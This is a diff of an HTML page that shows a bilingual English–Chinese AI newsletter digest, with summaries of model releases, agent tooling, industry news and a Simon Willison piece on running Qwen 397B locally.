-Aristotle Agent is an autonomous mathematician that can solve and formalize the world's most challenging mathematical research problems. It is fully agentic and can produce repo-quality code. Aristotle Agent can autonomously prove/formalize for up to 24 hrs without human intervention. It is now live on web, CLI, and API, currently free of charge.
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Aristotle Agent</strong> 是一位自主数学家，能够解决和形式化（formalize）世界上最具挑战性的数学研究问题。它具备完全的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">agentic</strong>（智能体化）能力，可生成仓库级质量的代码。Aristotle Agent 能够自主进行证明/形式化工作，最长可持续 24 小时无需人工干预。目前已在网页端、CLI 和 API 上线，暂时免费提供。
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">MiniMax</strong>'s <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">M2.7</strong> model is now publicly available via the MiniMax Agent and the MiniMax <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">API</strong> Platform. It supports complex workflows in software engineering, office productivity, and research environments. The model features capabilities like autonomous debugging and research agent harnesses. MiniMax's release marks a shift towards models that participate in their own evolution.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">MiniMax</strong> 的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">M2.7</strong> 模型现已通过 MiniMax Agent 和 MiniMax <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">API</strong>（应用程序编程接口）平台公开发布。该模型支持软件工程、办公效率和研究环境中的复杂工作流，具备自主调试和研究智能体（research agent）能力等特性。MiniMax 此次发布标志着模型正朝着能够参与自身进化的方向转变。</p>
 
-<h3 style="margin:24px 0 12px;">GPT‑5.4 Mini and Nano (4 minute read)</h3>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-OpenAI released GPT‑5.4 mini and nano, smaller models designed for high‑volume workloads with faster speeds and lower cost. GPT‑5.4 mini improves substantially over GPT‑5 mini and approaches the larger GPT‑5.4 model on some benchmarks, while GPT‑5.4 nano targets lightweight tasks like classification, extraction, and ranking.
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-OpenAI 发布了 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">GPT-5.4 mini</strong> 和 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">nano</strong>，这是专为高吞吐量工作负载设计的更小模型，具有更快的速度和更低的成本。GPT-5.4 mini 相比 GPT-5 mini 有显著提升，在某些基准测试中接近更大的 GPT-5.4 模型；而 GPT-5.4 nano 则针对分类、提取和排序等轻量级任务。
-</p>
 
-<h3 style="margin:24px 0 12px;">How to Stop Your Autoresearch Loop from Cheating (4 minute read)</h3>
+<h4 style="margin:24px 0 12px;">How China is getting everyone on OpenClaw, from gearheads to grandmas (4 minute read)</h4>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-Experiments with the autoresearch framework show that environment design and strict validation gates are more critical than model choice for preventing agent drift. While independent models discovered identical optimizations in structured landscapes, the primary bottlenecks remain infrastructure failures and GPU costs from rejected proposals.
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-针对 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">autoresearch</strong>（自主研究）框架的实验表明，环境设计和严格的验证门控（validation gates）比模型选择更为关键，以防止 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">agent drift</strong>（智能体漂移）。尽管独立模型在结构化环境中发现了相同的优化方案，但主要瓶颈仍然是基础设施故障以及因提案被拒绝而产生的 GPU 成本。
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">China aggressively promotes <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenClaw</strong>, a popular AI assistant, through public events organized by major tech firms like <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Baidu</strong> and <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Tencent</strong>. This AI tool enables personal automation, supporting China's vision for widespread AI integration by 2030.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">中国正积极推广 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenClaw</strong>（一款热门的 AI 助手），通过 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Baidu</strong>（百度）和 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Tencent</strong>（腾讯）等主要科技公司组织的公共活动进行宣传。这款 AI 工具支持个人自动化，契合中国到 2030 年实现 AI 广泛普及的愿景。</p>
 
-<h3 style="margin:24px 0 12px;">Building Claude Code: How We Use Skills (4 minute read)</h3>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-Anthropic's internal framework treats AI "skills" as functional folders containing scripts and assets rather than static text, using the file system for context engineering. Nine core categories emerged, with product verification and "Gotchas" sections identified as the highest-leverage components for improving output reliability. This shift toward progressive disclosure allows agents to fetch specific data and runbooks only when needed, reducing context noise and error rates.
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong> 的内部框架将 AI"技能"视为包含脚本和资产的功能性文件夹，而非静态文本，利用文件系统进行上下文工程。该框架形成了九大核心类别，其中产品验证（product verification）和"陷阱提示"（Gotchas）部分被认为是提高输出可靠性的最高杠杆组件。这种向渐进式披露（progressive disclosure）的转变允许智能体仅在需要时获取特定数据和运行手册，从而减少上下文噪音和错误率。
-</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-👨‍💻
-</div>
+<h4 style="margin:24px 0 12px;">Xiaomi stuns with new MiMo-V2-Pro LLM nearing GPT-5.2, Opus 4.6 performance at a fraction of the cost (10 minute read)</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Xiaomi</strong>'s <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MiMo-V2-Pro</strong> is a 1-trillion-parameter foundation model with performance approaching that of models from OpenAI and Anthropic but at a fraction of the cost. The model uses a <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">sparse architecture</strong> that only activates 42 billion parameters during any single forward pass. It has a <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Multi-Token Prediction</strong> layer that allows it to anticipate and generate multiple tokens simultaneously, drastically reducing the latency required for 'thinking'. The model is currently only available via Xiaomi's first-party API. Xiaomi plans to release an open source variant of the model.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Xiaomi</strong>（小米）的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MiMo-V2-Pro</strong> 是一个拥有万亿参数的基础模型，其性能接近 OpenAI 和 Anthropic 的模型，但成本仅为后者的一小部分。该模型采用<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">稀疏架构</strong>（sparse architecture），在单次前向传播中仅激活 420 亿参数。它配备<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">多Token预测</strong>（Multi-Token Prediction）层，能够同时预测和生成多个 token，大幅降低了"思考"所需的延迟。该模型目前仅通过小米官方 API 提供，但小米计划发布其开源版本。</p>
+
+
+
+<h4 style="margin:24px 0 12px;">GPT 5.4 is a big step for Codex (7 minute read)</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">GPT 5.4</strong> brings a ton more simple usability and '<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">agentness</strong>'. It is the first <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> agent that feels like it can do a lot of random tasks. The instruction following of the model is precise, and the model just does what you tell it to do. GPT 5.4 will likely appeal to the master coordinator who wants to unleash an AI army on distributed tasks.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">GPT 5.4</strong> 在简单易用性和"<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">智能体特性</strong>"（agentness）方面带来了巨大提升。这是首个让人感觉能够执行各种随机任务的 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> 智能体（agent）。该模型的指令遵循能力非常精确，能够按照用户的指示执行任务。GPT 5.4 可能会吸引那些希望将 AI 大军投入到分布式任务中的高级协调员。</p>
+
+
+
+<h4 style="margin:24px 0 12px;">What 81,000 people want from AI (35 minute read)</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong> conducted a large-scale study with 80,508 global participants to understand their hopes and fears about AI usage. Key desires include professional excellence and life improvements, while main concerns revolve around AI unreliability and <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">job displacement</strong>. People experience AI as both a productivity tool and a potential dependency, highlighting its dual role in enhancing and complicating life.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong> 开展了一项大规模研究，共有 80,508 名全球参与者，旨在了解他们对 AI 使用的期望与担忧。主要期望包括职业卓越和生活改善，而主要担忧则集中在 AI 的不可靠性和<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">工作岗位替代</strong>（job displacement）方面。人们将 AI 视为既是一种生产力工具，也可能成为一种潜在依赖，突显了 AI 在改善生活与使生活复杂化之间的双重角色。</p>
+
+
+
+<h4 style="margin:24px 0 12px;">How did Anthropic do it? (4 minute read)</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong> was popular early on with the earliest adopters. The company is now leveraging that early-adopter base to go mainstream. Data suggests that the company's tools are becoming the consumer default. Anthropic still struggles to meet its own demand and is actively turning away revenue because it doesn't have the <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">compute</strong> to serve it. Demand for its products is growing despite the company charging more for roughly equivalent performance.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong> 在早期就深受最早一批采用者的欢迎。该公司目前正利用这一早期采用者基础向主流市场扩张。数据显示，该公司的工具正成为消费者的首选。然而，Anthropic 仍难以满足自身的需求，由于缺乏足够的<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">算力</strong>（compute）来提供服务，公司正在主动拒绝部分收入。尽管对大致相当的性能收取更高费用，但其产品的需求仍在增长。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">👨‍💻</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">👨‍💻</p>
+
+
 
 <h3 style="margin:24px 0 12px;">Engineering & Research</h3>
 
-<h3 style="margin:24px 0 12px;">AI Security Best Practices by Datadog (Sponsor)</h3>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-Learn to secure:
-<ul>
-<li>Components that host and run AI applications</li>
-<li>Software and data used by AI applications</li>
-<li>Entry points and business logic that enable a user to interact with AI</li>
-</ul>
-Download the guide ↗️
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-学习如何保护：
-<ul style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-<li>托管和运行 AI 应用的组件</li>
-<li>AI 应用使用的软件和数据</li>
-<li>允许用户与 AI 交互的入口点和业务逻辑</li>
-</ul>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">下载指南 ↗️</p>
-</p>
 
-<h3 style="margin:24px 0 12px;">Introducing Unsloth Studio (7 minute read)</h3>
+<h4 style="margin:24px 0 12px;">Gartner report: Your productivity stack is about to face its first real competition in 30 years (Sponsor)</h4>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-Unsloth Studio is a no-code web UI for training, running, and exporting open models. It allows users to run GGUF and safe tensor models locally on Mac, Windows, and Linux, and run and train text, vision, TTS audio, and embedding models. The studio can auto-create data sets from PDF, CSV, JSON, DOCX, and TXT files. A video tutorial on how to get started with Unsloth Studio is available.
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Unsloth Studio</strong> 是一个用于训练、运行和导出开源模型的无代码 Web 界面。它允许用户在 Mac、Windows 和 Linux 上本地运行 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">GGUF</strong>（一种量化格式）和安全张量模型，并运行和训练文本、视觉、TTS（文本转语音）音频和嵌入模型。该工作室可从 PDF、CSV、JSON、DOCX 和 TXT 文件自动创建数据集。目前已提供如何入门 Unsloth Studio 的视频教程。
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">GenAI</strong> and AI agents are predicted to trigger a $58 billion shake-up in the productivity software market – the biggest disruption since the mid-90s. The winners will be what <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Gartner</strong> calls "<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">AI workhubs</strong>": unified, AI-native workspaces that make fragmented legacy stack look like a filing cabinet.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">预测显示，<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">生成式AI</strong>（GenAI）和 AI 智能体将引发生产力软件市场 580 亿美元的巨变——这是自 90 年代中期以来最大的颠覆。赢家将是 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Gartner</strong> 所称的"<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">AI 工作中心</strong>"（AI workhubs）：统一的、原生 AI 工作空间，它们将使碎片化的传统技术栈看起来像个文件柜。</p>
 
-<h3 style="margin:24px 0 12px;">Mixture‑of‑Depths Attention (GitHub Repo)</h3>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-MoDA introduces a new attention mechanism that lets each head access both current‑layer and earlier‑layer key‑value pairs, helping preserve useful signals as models scale deeper.
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MoDA</strong>（深度混合注意力机制）引入了一种新的注意力机制，使每个注意力头（head）都能访问当前层和早期层的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">key-value pairs</strong>（键值对），有助于在模型深度扩展时保留有用的信号。
-</p>
 
-<h3 style="margin:24px 0 12px;">Cursor Trains Models to Self‑Summarize Context (9 minute read)</h3>
+<h4 style="margin:24px 0 12px;">Agent Package Manager (GitHub Repo)</h4>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-Cursor described how its Composer model learns to summarize its own context during long coding sessions, compressing earlier steps into shorter representations to extend effective working memory. The trained behavior improves performance on multi‑step programming tasks while keeping token usage manageable.
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Cursor</strong> 描述了其 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Composer model</strong>（Composer 模型）如何学习在长时间编码会话中自主总结上下文，将早期步骤压缩为更短的表示形式，以扩展有效工作记忆。这种经过训练的行为提升了多步骤编程任务的表现，同时保持 token 使用量可控。
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Microsoft</strong>'s <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Agent Package Manager</strong> is an open source, community-driven dependency manager for AI agents. It allows every developer who clones a repository to get a fully configured agent setup in seconds. Developers just have to declare their project's agentic dependencies once in a <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">YML</strong> file. The package manager works with GitHub Copilot, Claude Code, Cursor, and OpenCode.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Microsoft</strong>（微软）的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Agent Package Manager</strong>（智能体包管理器）是一个开源的、社区驱动的 AI 智能体依赖管理器。它允许每位克隆仓库的开发者在几秒钟内获得完全配置好的智能体环境。开发者只需在 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">YML</strong> 文件中声明一次项目的智能体依赖即可。该包管理器兼容 GitHub Copilot、Claude Code、Cursor 和 OpenCode。</p>
 
-<h3 style="margin:24px 0 12px;">Measuring progress toward AGI: A cognitive framework (3 minute read)</h3>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-Google DeepMind released a paper outlining a cognitive taxonomy to measure AI progress toward AGI, identifying 10 key cognitive abilities like perception, learning, and reasoning. It proposes a three-stage evaluation protocol comparing AI performance to human benchmarks. A Kaggle hackathon, with a $200,000 prize pool, invites researchers to develop evaluations for five under-assessed abilities, using a new Community Benchmarks platform.
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Google DeepMind</strong> 发布了一篇论文，概述了一种用于衡量 AI 向 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">AGI</strong>（通用人工智能，Artificial General Intelligence）进展的认知分类体系，识别了感知、学习和推理等 10 项关键认知能力。该论文提出了一个三阶段评估协议，将 AI 表现与人类基准进行比较。一场奖金池为 20 万美元的 Kaggle 黑客马拉松邀请研究人员为五项评估不足的能力开发评测方法，使用新的 Community Benchmarks 平台。
-</p>
 
-<h3 style="margin:24px 0 12px;">Microsoft Seeks More Coherence in AI Efforts With Copilot Reorganization (4 minute read)</h3>
+<h4 style="margin:24px 0 12px;">Enterprise Vision-Language Models (GitHub Repo)</h4>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-Microsoft is reorganizing the teams that work on its flagship Copilot AI product. It is unifying the teams that work on its Microsoft 365 Copilot productivity offerings and the consumer version of Copilot. Jacob Andreou, who leads product and growth for Microsoft AI, will become the executive vice-president of Copilot and will be in charge of its design, product, growth, and engineering. Mustafa Suleman, Microsoft AI's chief executive, will focus primarily on the company's proprietary models and on achieving superintelligence. The new setup will enable the company to deliver a more coherent and competitive experience.
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-微软正在重组其旗舰 AI 产品 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Copilot</strong> 的开发团队，统一负责 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Microsoft 365 Copilot</strong> 生产力产品和 Copilot 消费者版的团队。<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Jacob Andreou</strong>（负责微软 AI 产品和增长）将出任 Copilot 执行副总裁，负责其设计、产品、增长和工程。<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Mustafa Suleman</strong>（微软 AI 首席执行官）将主要专注于公司的专有模型和实现超级智能（superintelligence）。新的架构将使公司能够提供更连贯、更具竞争力的体验。
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Baidu</strong>'s <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Qianfan‑VL</strong> is a series of enterprise-focused <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">vision‑language models</strong> optimized for industrial use cases such as document parsing, OCR, and complex visual reasoning while maintaining general multimodal capabilities.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Baidu</strong>（百度）的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Qianfan‑VL</strong>（千帆-VL）是一系列面向企业级的<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">视觉-语言模型</strong>（vision‑language models），针对文档解析、OCR（光学字符识别）和复杂视觉推理等工业用例进行了优化，同时保持通用的多模态能力。</p>
 
-<h3 style="margin:24px 0 12px;">Nvidia Says It Is Restarting Production of AI Chips for Sale in China (3 minute read)</h3>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-Nvidia has restarted the manufacture of H200 processors for sale in China. The US announced that it would allow Nvidia to sell its H200 processor in China in December, as long as 25% of sales were shared with the US government. Nvidia CEO Jensen Huang announced at the company's GTC event on Tuesday that demand signals out of China have strengthened in recent weeks and that the company's supply chain is getting fired up. The company has not commented on how much it expects to earn from H200 sales in China, but the Chinese market is estimated to be worth tens of billions of dollars a year.
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-英伟达（Nvidia）已重启 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">H200</strong> 处理器的生产，以在中国销售。美国政府去年 12 月宣布允许英伟达在中国销售 H200 处理器，条件是销售额的 25% 需与美国政府分成。英伟达 CEO <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Jensen Huang</strong>（黄仁勋）在周二的 GTC 大会上表示，近几周来自中国的需求信号有所增强，公司的供应链正在启动。该公司未对 H200 在华销售预期收入置评，但据估计中国市场每年价值数十亿美元。
-</p>
+
+<h4 style="margin:24px 0 12px;">Introducing the Machine Payments Protocol (2 minute read)</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Stripe</strong> announced support for programmable <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">LLMs</strong>, enabling businesses to create customized payment experiences. This feature allows companies to integrate AI models into their payment processes for enhanced user interactions. Stripe's new LLM support aims to streamline and personalize the payment journey for users.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Stripe</strong> 宣布支持可编程 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">LLM</strong>（大语言模型），使企业能够创建定制化的支付体验。该功能允许公司将 AI 模型集成到支付流程中，以增强用户交互。Stripe 对 LLM 的新支持旨在简化和个性化用户的支付旅程。</p>
+
+
+
+<h4 style="margin:24px 0 12px;">How to Make Sense of AI (17 minute read)</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Effective AI <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">sensemaking</strong> involves focusing solely on detailed <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">field reports</strong> while ignoring opinions, predictions, and speculative essays. The method emphasizes four key questions: new outcomes, potential actions, relative outcome values, and causal relationships.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">有效的 AI <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">意义建构</strong>（sensemaking）涉及仅关注详细的<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">实地报告</strong>（field reports），同时忽略观点、预测和推测性文章。该方法强调四个关键问题：新成果、潜在行动、相对结果价值以及因果关系。</p>
+
+
+
+<h4 style="margin:24px 0 12px;">The internet ruined customer service. AI could save it. (13 minute read)</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">AI can revolutionize <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">customer service</strong> by offering personalized, scalable, and concierge-like experiences for all consumers, bridging the gap between luxury services and mass-market customer support. <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Decagon</strong>, a leading AI platform, enhances customer service by resolving over 80% of inquiries autonomously, boosting satisfaction, and drastically reducing costs. If successful, this model transforms customer interaction into a continuous, proactive relationship, fundamentally changing the way businesses engage with consumers worldwide.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">AI 可以通过为所有消费者提供个性化、可扩展且类似于礼宾服务的体验来彻底改变<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">客户服务</strong>（customer service），弥合 luxury 服务与大众市场客户支持之间的差距。领先的 AI 平台 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Decagon</strong> 通过自主解决超过 80% 的咨询、提升满意度并大幅降低成本来增强客户服务。如果成功，这种模式将把客户互动转变为一种持续、主动的关系，从根本上改变企业与全球消费者的互动方式。</p>
+
+
 
 <h3 style="margin:24px 0 12px;">Get the most interesting AI stories and breakthroughs delivered in a free daily email.</h3>
 
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Join 920,000 readers for</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">加入 920,000 名读者的行列，获取</p></div>
+      <button class="toggle-btn" onclick="toggleTranslation(this)">展开全文翻译</button>
+      <a class="link" href="https://tldr.tech/ai/2026-03-19" target="_blank">阅读原文 &rarr;</a>
+    </div>
+
+<div class="article-card">
+      <div class="source">Simon Willison</div>
+      <div class="title-row">
+        <div class="title">自动研究：利用苹果&#x27;闪存LLM&#x27;技术本地运行Qwen 397B</div>
+        <span class="tone-pill" style="background:#d1fae5;color:#047857">🧪 实验记录</span>
+      </div>
+      <div class="title-en">Autoresearching Apple&#x27;s &quot;LLM in a Flash&quot; to run Qwen 397B locally</div>
+      <div class="tags"><span class="tag">大模型</span><span class="tag">本地部署</span><span class="tag">闪存推理</span><span class="tag">MLX</span></div>
+      <div class="summary">开发者借鉴苹果&quot;LLM in a Flash&quot;方案，通过从SSD按需流式加载MoE专家权重、将参数量化至2-4比特并减少激活专家数量，成功在本地运行397B参数的Qwen 3.5大模型，以有限内存实现了4.36 tokens/秒的高效推理。</div>
+      <div class="quotes-section">
+<div class="quote-block"><div class="quote-en">He fed the paper to Claude Code and used a variant of Andrej Karpathy&#x27;s autoresearch pattern to have Claude run 90 experiments and produce MLX Objective-C and Metal code that ran the model as efficiently as possible.</div><div class="quote-zh">他将论文输入Claude Code，使用Andrej Karpathy&#x27;自动研究&#x27;模式的变体，让Claude运行90次实验并生成MLX Objective-C和Metal代码，以尽可能高效地运行该模型。</div></div>
+<div class="quote-block"><div class="quote-en">It&#x27;s not clear to me how much the quality of the model results are affected. Claude claimed that &#x27;Output quality at 2-bit is indistinguishable from 4-bit for these evaluations&#x27;, but the description of the evaluations it ran is quite thin.</div><div class="quote-zh">目前尚不清楚模型结果的质量受到了多大影响。Claude声称&#x27;在这些评估中，2位量化的输出质量与4位量化无法区分&#x27;，但它所运行评估的描述相当单薄。</div></div>
+</div>
+      <div class="translation"><h3 style="margin:24px 0 12px;">Autoresearching Apple's "LLM in a Flash" to run Qwen 397B locally</h3>
+
 <div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-Join 920,000 readers for
+<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Qwen3.5-397B-A17B</strong> is a <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Mixture-of-Experts (MoE)</strong> model, which means that each token only needs to run against a subset of the overall model weights. These expert weights can be streamed into memory from <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">SSD</strong>, saving them from all needing to be held in RAM at the same time.
 </div>
